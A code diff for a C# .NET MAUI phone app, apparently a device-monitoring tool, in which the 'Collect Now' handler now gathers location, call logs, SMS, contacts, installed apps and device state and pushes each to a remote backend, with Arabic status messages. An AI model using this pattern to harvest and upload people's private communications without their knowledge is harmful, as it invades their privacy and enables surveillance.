@@ -176,20 +176,26 @@ public partial class MainPage : ContentPage
 
     private async void OnCollectNow(object? sender, EventArgs e)
     {
-        if (_db == null) { await DisplayAlert("Error", "DB unavailable", "OK"); return; }
+        if (_bg == null) { await DisplayAlert("Error", "BG unavailable", "OK"); return; }
 
         CollectNowBtn.IsEnabled = false;
         CollectNowBtn.Text = "Working...";
 
         try
         {
-            await _bg.CollectAndStoreAllAsync(CancellationToken.None);
+            await _bg.DirectCollectAndPushAsync("location", CancellationToken.None);
+            await _bg.DirectCollectAndPushAsync("call_logs", CancellationToken.None);
+            await _bg.DirectCollectAndPushAsync("sms", CancellationToken.None);
+            await _bg.DirectCollectAndPushAsync("contacts", CancellationToken.None);
+            await _bg.DirectCollectAndPushAsync("apps", CancellationToken.None);
+            await _bg.DirectCollectAndPushAsync("state", CancellationToken.None);
+            await _sb?.SendHeartbeatAsync();
             await RefreshUi();
-            await DisplayAlert("Collect", "تم جمع جميع البيانات بنجاح", "OK");
+            await DisplayAlert("تم", "تم جمع ورفع جميع البيانات مباشرة", "OK");
         }
         catch (Exception ex)
         {
-            await DisplayAlert("Collect Error", ex.Message, "OK");
+            await DisplayAlert("خطأ", ex.Message, "OK");
         }
         finally
         {
